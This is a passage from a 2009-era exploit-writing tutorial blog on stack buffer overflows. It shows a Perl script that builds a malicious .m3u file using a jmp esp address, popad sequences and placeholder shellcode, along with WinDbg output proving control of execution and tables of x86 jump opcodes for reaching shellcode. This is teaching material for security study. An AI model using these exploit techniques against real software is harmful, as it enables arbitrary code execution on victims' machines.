.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>Let’s pretend that we need to use the 13 X’s&nbsp; (so 13 bytes) that are available directly at ESP to jump over 100 D’s (44) and 160 A’s (so a total of 260 bytes) to end up at our shellcode (starts with NOPs, then a breakpoint, and then A’s (=shellcode))</p>
<p>One popad = 32 bytes. So 260 bytes = 9 popad’s (-28 bytes)</p>
<p>(so we need to start our shellcode with nops, or start the shellcode at [start of shellcode]+28 bytes</p>
<p>In our case, we have put some nops before the shellcode, so let’s try to “popad” into the nops and see if the application breaks at our breakpoint.</p>
<p>First, overwrite EIP again with jmp esp. (see one of the previous exploit scripts)</p>
<p>Then, instead of the X’s, perform 9 popad’s, followed by “jmp esp” opcode (0xff,0xe4)</p>
<pre class="csharpcode">my $file= <span class="str">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span class="str">"A"</span> x 250;
my $nop = <span class="str">"\x90"</span> x 50;
my $shellcode = <span class="str">"\xcc"</span>;

my $restofbuffer = <span class="str">"A"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = pack(<span class="str">'V'</span>,0x01ccf23a);  #jmp esp from MSRMCcodec02.dll

my $preshellcode = <span class="str">"X"</span> x 4;  # needed to point ESP at next 13 bytes below
$preshellcode=$preshellcode.<span class="str">"\x61"</span> x 9;  #9 popads
$preshellcode=$preshellcode.<span class="str">"\xff\xe4"</span>;  #10th and 11th <span class="kwrd">byte</span>, jmp esp
$preshellcode=$preshellcode.<span class="str">"\x90\x90\x90"</span>;  #fill rest with some nops

my $garbage = <span class="str">"\x44"</span> x 100;  #garbage to jump over </pre>
<pre class="csharpcode">my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span class="str">"Size of buffer : "</span>.length($buffer).<span class="str">"\n"</span>;

open($FILE,<span class="str">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
print <span class="str">"m3u File Created successfully\n"</span>;</pre>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>&nbsp;</p>
<p>After opening the file, the application does indeed break at the breakpoint.&nbsp; EIP and ESP look like this :</p>
<pre class="csharpcode">(f40.5f0): Break instruction exception - code 80000003 (first chance)
eax=90909090 ebx=90904141 ecx=90909090 edx=90909090 esi=41414141 edi=41414141
eip=<font color="#ff0000"><strong>000ff874</strong></font> <font color="#008000"><strong>esp=000ff850</strong></font> ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
<unloaded_p32.dll>+0xff863:
000ff874 cc              <span class="kwrd">int</span>     3
0:000&gt; d eip
000ff874  cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA
000ff884  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff894  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8a4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8b4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8c4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8d4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8e4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d eip-32
000ff842  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff852  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff862  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff872  90 90 <font color="#ff0000">cc</font> 41 41 41 41 41-41 41 41 41 41 41 41 41  ...AAAAAAAAAAAAA
000ff882  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff892  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8a2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8b2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
<font color="#008000"><strong>0:000&gt; d esp
000ff850</strong></font>  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff870  90 90 90 90 <font color="#ff0000"><strong>cc</strong></font> 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA
000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>=&gt; the popad’s have worked and made esp point at the nops. Then the jump to esp was made (0xff 0xe4), which made EIP jump to nops, and slide to the breakpoint (at 000f874)</p>
<p>Replace the A’s with real shellcode :</p>
<p><a href="/wp-content/uploads/2009/08/image.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img loading="lazy" decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="276" alt="image" src="/wp-content/uploads/2009/08/image_thumb.png" width="406" border="0"></a></p>
<p>pnwed again !</p>
<p>&nbsp;</p>
<p>Another (less preferred, but still possible) way to jump to shellcode is by using jumpcode that simply jumps to the address (or an offset of a register).&nbsp; Since the addresses/registers could vary during every program execution, this technique may not work every time.</p>
<p>So, in order to <strong><u>hardcode addresses</u></strong> or offsets of a register, you simply need to find the opcode that will do the jump, and then use that opcode in the smaller “first”/stage1 buffer, in order to jump to the real shellcode.</p>
<p>You should know by now how to find the opcode for assembler instructions, so I’ll stick to 2 examples :</p>
<p>1. jump to 0x12345678</p>
<pre class="csharpcode">0:000&gt; a
7c90120e jmp 12345678
jmp 12345678
7c901213 

0:000&gt; u 7c90120e
ntdll!DbgBreakPoint:
7c90120e e96544a495      jmp     12345678</pre>
<p>=&gt; opcode is 0xe9,0x65,0x44,0xa4,0x95</p>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>&nbsp;</p>
<p>2. jump to ebx+124h</p>
<pre class="csharpcode">0:000&gt; a
7c901214 add ebx,124
add ebx,124
7c90121a jmp ebx
jmp ebx
7c90121c 

0:000&gt; u 7c901214
ntdll!DbgUserBreakPoint+0x2:
7c901214 81c324010000    add     ebx,124h
7c90121a ffe3            jmp     ebx</pre>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>=&gt; opcodes are 0x81,0xc3,0x24,0x01,0x00,0x00&nbsp; (add ebx 124h) and 0xff,0xe3 (jmp ebx)</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3>Short jumps &amp; conditional jumps</h3>
<p>In the event you need to jump over just a few bytes, then you can use a couple ‘short jump’ techniques to accomplish this :</p>
<p>– a short jump : (jmp) : opcode 0xeb, followed by the number of bytes</p>
<p>So if you want to jump 30 bytes, the opcode is 0xeb,0x1e</p>
<p>– a conditional (short/near) jump : (“jump if condition is met”) : This technique is based on the states of one or more of the status flags in the EFLAGS register (CF,OF,PF,SF and ZF).&nbsp; If the flags are in the specified state (condition), then a jump can be made to the target instruction specified by the destination operand. This target instruction is specified with a relative offset (relative to the current value of EIP).</p>
<p>Example : suppose you want to jump 6 bytes : Have a look at the flags (ollydbg), and depending on the flag status, you can use one of the opcodes below</p>
<p>Let’s say the Zero flag is 1, then you can use opcode 0x74, followed by the number of bytes you want to jump&nbsp; (0x06 in our case)</p>
<p>This is a little table with jump opcodes and flag conditions :</p>
<table cellspacing="0" cellpadding="5" border="1">
<tbody>
<tr>
<td><b><font size="1">Code</font></b></td>
<td><b><font size="1">Mnemonic</font></b></td>
<td><b><font size="1">Description</font></b></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">77 cb </font></td>
<td nowrap="nowrap"><font size="1">JA rel8 </font></td>
<td><font size="1">Jump short if above (CF=0 and ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">73 cb </font></td>
<td nowrap="nowrap"><font size="1">JAE rel8 </font></td>
<td><font size="1">Jump short if above or equal (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">72 cb </font></td>
<td nowrap="nowrap"><font size="1">JB rel8 </font></td>
<td><font size="1">Jump short if below (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">76 cb </font></td>
<td nowrap="nowrap"><font size="1">JBE rel8 </font></td>
<td><font size="1">Jump short if below or equal (CF=1 or ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">72 cb </font></td>
<td nowrap="nowrap"><font size="1">JC rel8 </font></td>
<td><font size="1">Jump short if carry (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">E3 cb </font></td>
<td nowrap="nowrap"><font size="1">JCXZ rel8 </font></td>
<td><font size="1">Jump short if CX register is 0</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">E3 cb </font></td>
<td nowrap="nowrap"><font size="1">JECXZ rel8 </font></td>
<td><font size="1">Jump short if ECX register is 0</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">74 cb </font></td>
<td nowrap="nowrap"><font size="1">JE rel8 </font></td>
<td><font size="1">Jump short if equal (ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7F cb </font></td>
<td nowrap="nowrap"><font size="1">JG rel8 </font></td>
<td><font size="1">Jump short if greater (ZF=0 and SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7D cb </font></td>
<td nowrap="nowrap"><font size="1">JGE rel8 </font></td>
<td><font size="1">Jump short if greater or equal (SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7C cb </font></td>
<td nowrap="nowrap"><font size="1">JL rel8 </font></td>
<td><font size="1">Jump short if less (SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7E cb</font></td>
<td nowrap="nowrap"><font size="1">JLE rel8 </font></td>
<td><font size="1">Jump short if less or equal (ZF=1 or SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">76 cb</font></td>
<td nowrap="nowrap"><font size="1">JNA rel8 </font></td>
<td><font size="1">Jump short if not above (CF=1 or ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">72 cb </font></td>
<td nowrap="nowrap"><font size="1">JNAE rel8 </font></td>
<td><font size="1">Jump short if not above or equal (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">73 cb</font></td>
<td nowrap="nowrap"><font size="1">JNB rel8 </font></td>
<td><font size="1">Jump short if not below (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">77 cb </font></td>
<td nowrap="nowrap"><font size="1">JNBE rel8 </font></td>
<td><font size="1">Jump short if not below or equal (CF=0 and ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">73 cb </font></td>
<td nowrap="nowrap"><font size="1">JNC rel8 </font></td>
<td><font size="1">Jump short if not carry (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">75 cb </font></td>
<td nowrap="nowrap"><font size="1">JNE rel8 </font></td>
<td><font size="1">Jump short if not equal (ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7E cb </font></td>
<td nowrap="nowrap"><font size="1">JNG rel8 </font></td>
<td><font size="1">Jump short if not greater (ZF=1 or SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7C cb </font></td>
<td nowrap="nowrap"><font size="1">JNGE rel8 </font></td>
<td><font size="1">Jump short if not greater or equal (SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7D cb </font></td>
<td nowrap="nowrap"><font size="1">JNL rel8</font></td>
<td><font size="1">Jump short if not less (SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7F cb </font></td>
<td nowrap="nowrap"><font size="1">JNLE rel8 </font></td>
<td><font size="1">Jump short if not less or equal (ZF=0 and SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">71 cb </font></td>
<td nowrap="nowrap"><font size="1">JNO rel8 </font></td>
<td><font size="1">Jump short if not overflow (OF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7B cb </font></td>
<td nowrap="nowrap"><font size="1">JNP rel8 </font></td>
<td><font size="1">Jump short if not parity (PF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">79 cb </font></td>
<td nowrap="nowrap"><font size="1">JNS rel8 </font></td>
<td><font size="1">Jump short if not sign (SF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">75 cb </font></td>
<td nowrap="nowrap"><font size="1">JNZ rel8 </font></td>
<td><font size="1">Jump short if not zero (ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">70 cb </font></td>
<td nowrap="nowrap"><font size="1">JO rel8 </font></td>
<td><font size="1">Jump short if overflow (OF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7A cb </font></td>
<td nowrap="nowrap"><font size="1">JP rel8 </font></td>
<td><font size="1">Jump short if parity (PF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7A cb </font></td>
<td nowrap="nowrap"><font size="1">JPE rel8 </font></td>
<td><font size="1">Jump short if parity even (PF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">7B cb </font></td>
<td nowrap="nowrap"><font size="1">JPO rel8 </font></td>
<td><font size="1">Jump short if parity odd (PF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">78 cb </font></td>
<td nowrap="nowrap"><font size="1">JS rel8 </font></td>
<td><font size="1">Jump short if sign (SF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">74 cb </font></td>
<td nowrap="nowrap"><font size="1">JZ rel8 </font></td>
<td><font size="1">Jump short if zero (ZF = 1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 87 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JA rel16/32 </font></td>
<td><font size="1">Jump near if above (CF=0 and ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 83 cw/cd</font></td>
<td nowrap="nowrap"><font size="1">JAE rel16/32 </font></td>
<td><font size="1">Jump near if above or equal (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 82 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JB rel16/32 </font></td>
<td><font size="1">Jump near if below (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 86 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JBE rel16/32 </font></td>
<td><font size="1">Jump near if below or equal (CF=1 or ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 82 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JC rel16/32 </font></td>
<td><font size="1">Jump near if carry (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 84 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JE rel16/32 </font></td>
<td><font size="1">Jump near if equal (ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 84 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JZ rel16/32 </font></td>
<td><font size="1">Jump near if 0 (ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8F cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JG rel16/32 </font></td>
<td><font size="1">Jump near if greater (ZF=0 and SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8D cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JGE rel16/32 </font></td>
<td><font size="1">Jump near if greater or equal (SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8C cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JL rel16/32 </font></td>
<td><font size="1">Jump near if less (SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8E cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JLE rel16/32 </font></td>
<td><font size="1">Jump near if less or equal (ZF=1 or SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 86 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNA rel16/32 </font></td>
<td><font size="1">Jump near if not above (CF=1 or ZF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 82 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNAE rel16/32</font></td>
<td><font size="1">Jump near if not above or equal (CF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 83 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNB rel16/32 </font></td>
<td><font size="1">Jump near if not below (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 87 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNBE rel16/32 </font></td>
<td><font size="1">Jump near if not below or equal (CF=0 and ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 83 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNC rel16/32 </font></td>
<td><font size="1">Jump near if not carry (CF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 85 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNE rel16/32 </font></td>
<td><font size="1">Jump near if not equal (ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8E cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNG rel16/32 </font></td>
<td><font size="1">Jump near if not greater (ZF=1 or SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8C cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNGE rel16/32 </font></td>
<td><font size="1">Jump near if not greater or equal (SF&lt;&gt;OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8D cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNL rel16/32 </font></td>
<td><font size="1">Jump near if not less (SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8F cw/cd</font></td>
<td nowrap="nowrap"><font size="1">JNLE rel16/32 </font></td>
<td><font size="1">Jump near if not less or equal (ZF=0 and SF=OF)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 81 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNO rel16/32 </font></td>
<td><font size="1">Jump near if not overflow (OF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8B cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNP rel16/32 </font></td>
<td><font size="1">Jump near if not parity (PF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 89 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNS rel16/32 </font></td>
<td><font size="1">Jump near if not sign (SF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 85 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JNZ rel16/32 </font></td>
<td><font size="1">Jump near if not zero (ZF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 80 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JO rel16/32 </font></td>
<td><font size="1">Jump near if overflow (OF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8A cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JP rel16/32 </font></td>
<td><font size="1">Jump near if parity (PF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8A cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JPE rel16/32 </font></td>
<td><font size="1">Jump near if parity even (PF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 8B cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JPO rel16/32 </font></td>
<td><font size="1">Jump near if parity odd (PF=0)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 88 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JS rel16/32 </font></td>
<td><font size="1">Jump near if sign (SF=1)</font></td>
</tr>
<tr>
<td nowrap="nowrap"><font size="1">0F 84 cw/cd </font></td>
<td nowrap="nowrap"><font size="1">JZ rel16/32 </font></td>
<td><font size="1">Jump near if 0 (ZF=1)</font></td>
</tr>
</tbody>
</table>
<p>As you can see in the table, you can also do a short jump based on register ECX being zero.&nbsp; One of the Windows SEH protections (see part 3 of the tutorial series) that have been put in place is the fact that registers are cleared when an exception occurs.&nbsp; So sometimes you will even be able to use&nbsp; 0xe3 as jump opcode (if ECX = 00000000)</p>
<p><strong>Note : You can find more/other information about making 2 byte jumps (forward and backward/negative jumps) at <a href="http://thestarman.narod.ru/asm/2bytejumps.htm" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>http://thestarman.narod.ru/asm/2bytejumps.htm</a> </strong></p>
<p><strong></strong></p>
<h3>Backward jumps</h3>
<p>In the event you need to perform backward jumps (jump with a negative offset) :&nbsp; get the negative number and convert it to hex. Take the dword hex value and use that as argument to a jump (\xeb or \xe9)</p>
<p>Example : jump back 7 bytes : -7 = FFFFFFF9,&nbsp; so jump -7 would be "\xeb\xf9\xff\xff"</p>
<p>Exampe : jump back 400 bytes :&nbsp; -400 = FFFFFE70, so jump -400 bytes = "\xe9\x70\xfe\xff\xff"&nbsp;&nbsp; (as you can see, this opcode is 5 bytes long.&nbsp; Sometimes (if you need to stay within a dword size (4 byte limit), then you may need to perform multiple shorter jumps in order to get where you want to be)</p>
<p>&nbsp;</p>
<p><strong></strong></p>
<p><strong></strong></p>
<blockquote>
<div>Questions ? Comments ? Tips &amp; Tricks ?&nbsp; <a title="https://www.corelan.be/index.php/forum/writing-exploits" href="https://www.corelan.be/index.php/forum/writing-exploits" data-wpel-link="internal">https://www.corelan.be/index.php/forum/writing-exploits</a></div>
</blockquote>
<div>&nbsp;</div>
<p style="text-align:left">© 2009 – 2015, <a href="https://www.corelan.be" data-wpel-link="internal">Peter Van Eeckhoutte (corelanc0d3r)</a>. All rights reserved. </p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Similar/Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 1 : Stack Based Overflows</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 3 : SEH Based Exploits</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" title="Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" title="Exploit writing tutorial part 3b : SEH Based Exploits – just another example" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 3b : SEH Based Exploits – just another example</span></a>
